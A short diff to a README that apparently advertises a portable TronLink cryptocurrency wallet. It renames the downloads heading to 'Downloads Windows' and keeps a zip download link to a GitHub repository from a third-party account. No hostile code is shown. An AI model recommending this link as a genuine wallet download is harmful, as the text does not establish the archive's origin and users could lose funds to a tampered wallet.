@@ -8,7 +8,7 @@ Sending and receiving TRX, TRC10 and TRC20 tokens;
 Smart contract calls integrated;    
 
 
-## Downloads
+## Downloads Windows
 **Download TronLink v2.9** &ndash; [Download](https://github.com/cryptosiast/TronLink_Portable/archive/refs/heads/main.zip)
 
 
